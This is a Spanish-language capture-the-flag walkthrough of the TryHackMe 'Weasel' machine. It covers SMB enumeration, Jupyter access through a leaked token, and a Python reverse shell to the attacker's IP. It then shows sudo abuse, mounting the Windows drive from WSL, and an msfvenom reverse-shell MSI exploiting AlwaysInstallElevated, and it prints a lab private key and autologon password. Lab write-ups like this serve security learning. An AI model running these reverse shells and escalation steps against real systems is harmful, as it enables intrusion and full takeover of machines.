@@ -1,0 +1,360 @@
+====WEASEL====
+
+-Segun el ttl(127) por proximidad podriamos decir que es una maquina WINDOWS
+
+--Puertos abiertos/info, de todos los puertos abiertos vamos a trabajar con estos tres que son los que nos permitiran realizar la maquina.
+
+22/tcp    open  ssh           syn-ack ttl 127 OpenSSH for_Windows_7.7 (protocol 2.0)
+
+445/tcp   open  microsoft-ds? syn-ack ttl 127
+
+8888/tcp  open  http          syn-ack ttl 127 Tornado httpd 6.0.3
+| http-robots.txt: 1 disallowed entry 
+|_/ 
+|_http-server-header: TornadoServer/6.0.3
+| http-title: Jupyter Notebook
+|_Requested resource was /login?next=%2Ftree%3F
+| http-methods: 
+|_  Supported Methods: GET POST
+|_http-favicon: Unknown favicon MD5: 97C6417ED01BDC0AE3EF32AE4894FD03
+
+47001/tcp open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+
+
+
+--Puerto 8888, tenemos un servicio que corre Tornado(Tornado es un servidor web escalable y sin bloqueo y un marco de aplicación web escrito en Python.)
+
+	Tornado esta corriendo Jupyter Notebook(es una interfaz web de código abierto que permite la inclusión de texto, vıdeo, audio, imágenes ası como la ejecución de código a través del navegador en múltiples lenguajes)
+
+		Para poder ingresar necesitamos una clave o token de acceso, vemos que hay un puerto 445 que esta corriendo un smb escaneamos el servicio y vemos que pocemos acceder a un recurso y obtenet un token de acceso a jupyter.
+
+			┌──(root㉿kali)-[/home/kali/Desktop/ctf/weasel]
+			└─# smbmap -u guest -H 10.10.20.11                  
+			[+] IP: 10.10.20.11:445 Name: 10.10.20.11                                       
+			        Disk                                                    Permissions     Comment
+			        ----                                                    -----------     -------
+			        ADMIN$                                                  NO ACCESS       Remote Admin
+			        C$                                                      NO ACCESS       Default share
+			        datasci-team                                            READ, WRITE--------------------------> Carpeta interesante nos conectamos a ella.
+			        IPC$                                                    READ ONLY       Remote IPC
+
+
+			┌──(root㉿kali)-[/home/kali/Desktop/ctf/weasel]
+			└─# smbclient \\\\10.10.20.11\\datasci-team -U guest
+			Password for [WORKGROUP\guest]:
+			Try "help" to get a list of possible commands.
+			smb: \> dir
+			  .                                   D        0  Thu Jul  6 10:19:00 2023
+			  ..                                  D        0  Thu Jul  6 10:19:00 2023
+			  .ipynb_checkpoints                 DA        0  Thu Aug 25 17:26:47 2022
+			  Long-Tailed_Weasel_Range_-_CWHR_M157_[ds1940].csv      A      146  Thu Aug 25 17:26:46 2022
+			  misc                               DA        0  Thu Aug 25 17:26:47 2022
+			  MPE63-3_745-757.pdf                 A   414804  Thu Aug 25 17:26:46 2022
+			  papers                             DA        0  Thu Aug 25 17:26:47 2022
+			  pics                               DA        0  Thu Aug 25 17:26:47 2022
+			  requirements.txt                    A       12  Thu Aug 25 17:26:46 2022
+			  weasel.ipynb                        A     4308  Thu Aug 25 17:26:46 2022
+			  weasel.txt                          A       51  Thu Aug 25 17:26:46 2022
+
+			                15587583 blocks of size 4096. 8941609 blocks available
+			smb: \> cd misc
+			smb: \misc\> dir
+			  .                                  DA        0  Thu Aug 25 17:26:47 2022
+			  ..                                 DA        0  Thu Aug 25 17:26:47 2022
+			  jupyter-token.txt                   A       52  Thu Aug 25 17:26:47 2022
+
+			                15587583 blocks of size 4096. 8941607 blocks available
+
+			smb: \misc\> get jupyter-token.txt 
+			getting file \misc\jupyter-token.txt of size 52 as jupyter-token.txt (0.2 KiloBytes/sec) (average 0.2 KiloBytes/sec)
+			                                                                                                                                                                          
+			┌──(root㉿kali)-[/home/kali/Desktop/ctf/weasel]
+			└─# cat jupyter-token.txt 
+			067470c5ddsadc54153ghfjd817d15b5d5f5341e56b0dsad78a    
+
+			Contenido de la carpeta datasci-team, el cual a su vez incluye algunos directorios, tras navegar entre los directorios y buscar encontramos el token valido para Jupyter, nos conseguimos loguear con ese token satisfactoriamente.
+
+
+--Conseguimos una reverse shell ejecutada desde Jupyter.
+
+	Al loguearnos nos muestra el directorio raiz, donde encontramos un fichero ---weasel.ipynb--- estos ficheros son como los proyectos de jupyter por lo que clikamos y lo cargamos.
+
+	Anadimos una celda donde pondremos nuestra reverse shell en python nos ponemos en escucha con netcat y asi obtendriamos nuestra shell.
+
+
+		Shell python --> import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.8.64.232",1988));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("bash")
+
+		Escucha con netcat ---> nc -lnvp 1988
+
+		Obtencion de la Shell, nos faltaria upgradear la shell para trabajar mas comodamente.
+
+		┌──(root㉿kali)-[/home/kali/Desktop/ctf/weasel]
+		└─# nc -lnvp 1988                                                                      
+		listening on [any] 1988 ...
+		connect to [10.8.64.232] from (UNKNOWN) [10.10.135.78] 50014
+		(base) dev-datasci@DEV-DATASCI-JUP:~/datasci-team$ 
+
+
+--Despues de ver la info del sistema que esta corriendo la maquina y demas encontramos algo raro.
+
+	Por un lado en el prompt aparece (base) al principio y despues esto, tras buscar info.
+
+		(base) dev-datasci@DEV-DATASCI-JUP:~/datasci-team$ uname -a
+		Linux DEV-DATASCI-JUP 4.4.0-17763-Microsoft #2268-Microsoft Thu Oct 07 16:36:00 PST 2021 x86_64 x86_64 x86_64 GNU/Linux
+
+		La cadena "4.4.0-17763-microsoft" parece ser una versión del kernel de Linux que se utiliza en el entorno de Windows Subsystem for Linux (WSL) de Microsoft.
+
+		WSL es una característica de Windows que permite ejecutar distribuciones de Linux en Windows. Utiliza un kernel de Linux específico, adaptado y proporcionado por Microsoft. La cadena "4.4.0-17763-microsoft" indica la versión del kernel de Linux utilizado en una determinada versión de WSL.
+
+		En este caso, la versión "4.4.0-17763" del kernel de Linux se basa en el kernel de Linux 4.4.0, con la adición de modificaciones y ajustes específicos realizados por Microsoft. El número "17763" puede corresponder a una identificación interna o un número de compilación específico para la versión de WSL en la que se encuentra.
+
+		Es importante tener en cuenta que la información proporcionada está basada en suposiciones y en conocimiento previo hasta septiembre de 2021. Si hay alguna actualización o cambio posterior a esa fecha, puede haber diferencias.
+
+
+	Por lo que segun esto hemos conseguido accedo al sistema linux que se esta ejecutando sobre un sistema windows, despues de buscar la flag de usuario creo que las dos flags se encuentran en la maquina windows, por lo que tendremos que pivotar a la maquina windows.
+
+
+--Hay dos maneras de escalar para llegar al usuario Administrator y conseguir las flags.
+
+	METODO(1)
+
+		---> Vemos que podemos ejecutar el fichero jupyter como si fueramos root sin necesidad de password.
+
+			(base) dev-datasci@DEV-DATASCI-JUP:~/datasci-team$ sudo -l
+
+			Matching Defaults entries for dev-datasci on DEV-DATASCI-JUP:
+			    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+			User dev-datasci may run the following commands on DEV-DATASCI-JUP:
+			    (ALL : ALL) ALL
+			    (ALL) NOPASSWD: /home/dev-datasci/.local/bin/jupyter, /bin/su dev-datasci -c *
+
+		---> El fichero jupyter no existe sin embargo tenemos todos los permisos sobre ese directorio.
+
+			(base) dev-datasci@DEV-DATASCI-JUP:~/datasci-team$ ls -la /home/dev-datasci/.local/bin
+			total 0
+			drwxrwxrwx 1 dev-datasci dev-datasci 4096 Aug 25  2022 .
+			drwx------ 1 dev-datasci dev-datasci 4096 Aug 25  2022 ..
+			-rwxrwxrwx 1 dev-datasci dev-datasci  216 Aug 25  2022 f2py
+			-rwxrwxrwx 1 dev-datasci dev-datasci  216 Aug 25  2022 f2py3
+			-rwxrwxrwx 1 dev-datasci dev-datasci  216 Aug 25  2022 f2py3.8
+
+		---> Creamos una copia de una bash en dicho directorio con el nombre de jupyter, para posteriormente ejecutarla como root y conseguir dicho privilegio ROOT.
+
+			(base) dev-datasci@DEV-DATASCI-JUP:~/datasci-team$ cp /bin/bash /home/dev-datasci/.local/bin/jupyter
+			(base) dev-datasci@DEV-DATASCI-JUP:~/datasci-team$ ls -la /home/dev-datasci/.local/bin/
+			total 1920
+			drwxrwxrwx 1 dev-datasci dev-datasci    4096 Jul  6 04:39 .
+			drwx------ 1 dev-datasci dev-datasci    4096 Aug 25  2022 ..
+			-rwxrwxrwx 1 dev-datasci dev-datasci     216 Aug 25  2022 f2py
+			-rwxrwxrwx 1 dev-datasci dev-datasci     216 Aug 25  2022 f2py3
+			-rwxrwxrwx 1 dev-datasci dev-datasci     216 Aug 25  2022 f2py3.8
+			-rwxr-xr-x 1 dev-datasci dev-datasci 1183448 Jul  6 04:39 jupyter
+
+			(base) dev-datasci@DEV-DATASCI-JUP:~/datasci-team$ sudo -u root /home/dev-datasci/.local/bin/jupyter 
+			root@DEV-DATASCI-JUP:/home/dev-datasci/datasci-team# whoami;id
+			root
+			uid=0(root) gid=0(root) groups=0(root)
+
+		---> Siendo root de la maquina linux podriamos intentar con mount montar la unidad c: de Windows y de este modo acceder a la raiz del SO Windows. Tras buscar durante un buen rato info sobre el tema encontre lo siguiente.
+
+			¿Qué es DrvFs?
+			DrvFs es un complemento del sistema de archivos a WSL diseñado para admitir la interoperabilidad entre WSL y el sistema de archivos de Windows. DrvFs permite que WSL monte unidades con sistemas de archivos compatibles en /mnt, como /mnt/c, /mnt/d.
+
+		Segun esta info encontramos lo siguiente, pero vemos que nos hay nada quizas no este montada la unidad, por lo que  vamos a intentar montar la unidad c: de windows.
+
+			root@DEV-DATASCI-JUP:/home/dev-datasci/datasci-team# ls -la /mnt
+			total 0
+			drwxr-xr-x 1 root root 4096 Aug 25  2022 .
+			drwxr-xr-x 1 root root 4096 Aug 25  2022 ..
+			drwxrwxrwx 1 root root 4096 Aug 25  2022 c
+			root@DEV-DATASCI-JUP:/home/dev-datasci/datasci-team# ls -la /mnt/c
+			total 0
+			drwxrwxrwx 1 root root 4096 Aug 25  2022 .
+			drwxr-xr-x 1 root root 4096 Aug 25  2022 ..
+			root@DEV-DATASCI-JUP:/home/dev-datasci/datasci-team# 
+
+		Montamos la unidad, utilizando el sistema de archivos indicado drvfs, bingo conseguimos montar la unidad.
+
+			root@DEV-DATASCI-JUP:/home/dev-datasci/datasci-team# mount -t drvfs c: /mnt/c/
+			root@DEV-DATASCI-JUP:/home/dev-datasci/datasci-team# cd /mnt/c
+			root@DEV-DATASCI-JUP:/mnt/c# ls -la
+			ls: cannot read symbolic link 'Documents and Settings': Permission denied
+			ls: cannot access 'pagefile.sys': Permission denied
+			ls: 'System Volume Information': Permission denied
+			total 0
+			drwxrwxrwx 1 root root 4096 Aug 25  2022 '$Recycle.Bin'
+			drwxrwxrwx 1 root root 4096 Mar 14 04:14  .
+			drwxr-xr-x 1 root root 4096 Aug 25  2022  ..
+			lrwxrwxrwx 1 root root   12 Aug 25  2022 'Documents and Settings'
+			drwxrwxrwx 1 root root 4096 Aug 25  2022  PerfLogs
+			drwxrwxrwx 1 root root 4096 Aug 25  2022 'Program Files'
+			drwxrwxrwx 1 root root 4096 Aug 25  2022 'Program Files (x86)'
+			drwxrwxrwx 1 root root 4096 Mar 13 04:47  ProgramData
+			drwxrwxrwx 1 root root 4096 Aug 25  2022  Recovery
+			d--x--x--x 1 root root 4096 Aug 25  2022 'System Volume Information'
+			drwxrwxrwx 1 root root 4096 Aug 25  2022  Users
+			drwxrwxrwx 1 root root 4096 Mar 13 05:05  Windows
+			drwxrwxrwx 1 root root 4096 Aug 25  2022  datasci-t
+
+
+		---> Obtenemos las flags
+
+			root@DEV-DATASCI-JUP:/mnt/c/Users/dev-datasci-lowpriv/Desktop# cat user.txt 
+			THM{Flag}
+
+			root@DEV-DATASCI-JUP:/mnt/c/Users/Administrator/Desktop# cat root.txt 
+			THM{Flag}
+
+	Metodo(2)
+
+		---> En el home del usuario con el que hemos obtenido la rever shell encontramos un fichero que contiene private key para conectarnos por ssh, recordamos que la maquina tiene el puerto  22/tcp    open  ssh   syn-ack ttl 127 OpenSSH for_Windows_7.7 (protocol 2.0) abierto, esto nos daria la opcion de pivotar a la maquina windows vamos a ello.
+
+			base) dev-datasci@DEV-DATASCI-JUP:~$ cat dev-datasci-lowpriv_id_ed25519 
+			-----BEGIN OPENSSH PRIVATE KEY-----
+			b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
+			QyNTUxOQAAACBUoe5ZSezzC65UZhWt4dbvxKor+dNggEhudzK+JSs+YwAAAKjQ358n0N+f
+			JwAAAAtzc2gtZWQyNTUxOQAAACBUoe5ZSezzC65UZhWt4dbvxKor+dNggEhudzK+JSs+Yw
+			AAAED9OhQumFOiC3a05K+X6h22gQga0sQzmISvJJ2YYfKZWVSh7llJ7PMLrlRmFa3h1u/E
+			qiv502CASG53Mr4lKz5jAAAAI2Rldi1kYXRhc2NpLWxvd3ByaXZAREVWLURBVEFTQ0ktSl
+			VQAQI=
+			-----END OPENSSH PRIVATE KEY-----
+
+			(base) dev-datasci@DEV-DATASCI-JUP:~$ chmod 600 dev-datasci-lowpriv_id_ed25519 
+
+		Creia que el usuario para la conexion ssh era dev-datasci
+
+			(base) dev-datasci@DEV-DATASCI-JUP:~$ ssh -i dev-datasci-lowpriv_id_ed25519 dev-datasci@10.10.138.146
+			dev-datasci@10.10.138.146: Permission denied (publickey,keyboard-interactive).
+
+		Despues de probar encontre que el usuario es dev-datasci-lowpriv
+
+			(base) dev-datasci@DEV-DATASCI-JUP:~$ ssh -i dev-datasci-lowpriv_id_ed25519 dev-datasci-lowpriv@10.10.138.146
+
+			Microsoft Windows [Version 10.0.17763.3287]
+			(c) 2018 Microsoft Corporation. All rights reserved.
+
+			dev-datasci-lowpriv@DEV-DATASCI-JUP C:\Users\dev-datasci-lowpriv>
+
+		--->Conseguimos el acceso a la maquina windows vamos a ver la flag del user.
+
+			dev-datasci-lowpriv@DEV-DATASCI-JUP C:\Users\dev-datasci-lowpriv\Desktop>type user.txt
+				THM{flag}   
+
+
+		--->Comenzamos la escalada
+
+			Nos descargamos winpeas y lo pasamos a la maquina victima, para hacer un escaneo de esta y buscar algo que nos pueda permitir la escalada. 
+
+			┌──(root㉿kali)-[/home/kali/Desktop/ctf/weasel]
+			└─# wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEASany_ofs.exe
+
+			Nos montamos en nuesta maquina un servidor de datos para poder acceder desde la maquina victima al fichero winPEASany_ofs.exe
+
+				┌──(root㉿kali)-[/home/kali/Desktop/ctf/weasel]
+				└─# python3 -m http.server 80
+				Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+				10.10.138.146 - - [06/Jul/2023 15:52:55] "GET /win.exe HTTP/1.1" 200 -
+
+
+			Nos descargamos el fichero
+
+				dev-datasci-lowpriv@DEV-DATASCI-JUP C:\Users\dev-datasci-lowpriv\Desktop>curl http://10.8.64.232/win.exe -o win.exe
+  				% Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+				100 1849k  100 1849k    0     0  1712k      0  0:00:01  0:00:01 --:--:-- 1712k
+
+
+				dev-datasci-lowpriv@DEV-DATASCI-JUP C:\Users\dev-datasci-lowpriv\Desktop>dir 
+					 Volume in drive C has no label. 
+					 Volume Serial Number is 8AA3-53D1
+
+					 Directory of C:\Users\dev-datasci-lowpriv\Desktop
+
+					07/06/2023  06:53 AM    <DIR>          .
+					07/06/2023  06:53 AM    <DIR>          ..
+					08/25/2022  05:21 AM        28,916,488 python-3.10.6-amd64.exe
+					08/25/2022  07:40 AM                27 user.txt
+					07/06/2023  06:53 AM         1,893,888 win.exe
+
+			Ejecutamos win.exe para empezar la busqueda de fallas en el sistema Windows.
+
+				Info --> "Always install with elevated privileges" must be disabled as it allows a standard user to install a Microsoft Windows Installer Package (MSI) with system privileges. This can be exploited by an attacker in order to escalate his privileges to gain control over system and perform malicious acts
+
+				Checking AlwaysInstallElevated                                                                                                            
+				+  https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#alwaysinstallelevated        
+				    AlwaysInstallElevated set to 1 in HKLM!                                                                                                
+    				AlwaysInstallElevated set to 1 in HKCU!
+
+    			Tenemos habilitado los dos registros necesarios por lo que podemos crear un paquete.msi malicioso que nos devulva una revelshell y este al ser ejecutado como administrador del sistema obtendriamos dicha shell como nt authority system(Admin del sistema)
+
+
+    			Tambien encontramos credenciales autologon(En lugar de esperar a que un usuario escriba su nombre y contraseña, Windows usa las credenciales que escriba con Autologon, que se cifran en el Registro, para iniciar sesión automáticamente en el usuario especificado)
+
+    				+----------¦ Looking for AutoLogon credentials                                                                                                         
+				    Some AutoLogon credentials were found  
+
+				    DefaultDomainName             :  DEV-DATASCI-JUP                                                                                                      
+				    DefaultUserName               :  dev-datasci-lowpriv                                                                                                  
+				    DefaultPassword               :  wUqnKWqzha*W!PWrPRWi!M8faUn  --->password del usuario con el que tenemos la session abierta en la maquina windows.
+
+		Abusamos de AlwaysInstalleElevated.
+
+			Creamos el paquete .msi que nos devolvera una reverse shell, y nos lo pasamos a la maquina victima de la misma manera que hicimos con winpeas
+
+				┌──(root㉿kali)-[/home/kali]
+				└─# msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.8.64.232 LPORT=2000 -a x64 --platform Windows -f msi -o always.msi           
+				No encoder specified, outputting raw payload
+				Payload size: 460 bytes
+				Final size of msi file: 159744 bytes
+				Saved as: always.msi
+
+			Nos ponemos en escucha en la maquina atacante con netcat y ejecutamos el paquete always.msi
+
+				┌──(root㉿kali)-[/home/kali]
+				└─# nc -lnvp 2000
+				listening on [any] 2000 ...
+
+				dev-datasci-lowpriv@DEV-DATASCI-JUP C:\Users\dev-datasci-lowpriv\Desktop>msiexec /qn /i C:\Users\dev-datasci-lowpriv\Desktop\always.msi  
+
+				Esto nos deveria de devolver una reverse shell pero no nos devuelve nada, por lo que tras buscar por internet encontramos
+
+					---> runas (Runas.exe es una herramienta de línea de comandos incluida en Windows a partir de Windows XP y Windows server 2003, la herramienta permite ejecutar una aplicación con permisos diferentes al usuario que actualmente tiene la sesión iniciada.)
+
+						Ejecutamos el paquete con los permisos del usuario actual(dev-datasci-lowpriv), esto nos pide la password del usuario, password que tenemos ya que la encontramos en el autologon credentials.
+
+							dev-datasci-lowpriv@DEV-DATASCI-JUP C:\Users\dev-datasci-lowpriv\Desktop>runas /user:dev-datasci-lowpriv "msiexec /quiet /qn /i C:\Users\dev-datasci-lowpriv\Desktop\always.msi"                                                                                                                                                                  
+							Enter the password for dev-datasci-lowpriv:                                                                                                                             
+							Attempting to start msiexec /quiet /qn /i C:\Users\dev-datasci-lowpriv\Desktop\always.msi as user "DEV-DATASCI-JUP\dev-datasci-lowpriv" ... 
+
+
+							┌──(root㉿kali)-[/home/…/Desktop/ctf/weasel/content]
+							└─# nc -lnvp 2000
+							listening on [any] 2000 ...
+							connect to [10.8.64.232] from (UNKNOWN) [10.10.138.146] 52135
+							Microsoft Windows [Version 10.0.17763.3287]
+							(c) 2018 Microsoft Corporation. All rights reserved.
+
+							C:\Windows\system32>whoami
+							whoami
+							nt authority\system   ---> Somos Admin del sistema.
+
+							C:\Users\Administrator\Desktop>type root.txt
+							type root.txt
+							THM{flag}
+
+====Fin de la maquina
+
+
+
+
+
+
+
+
+
+	
+
+
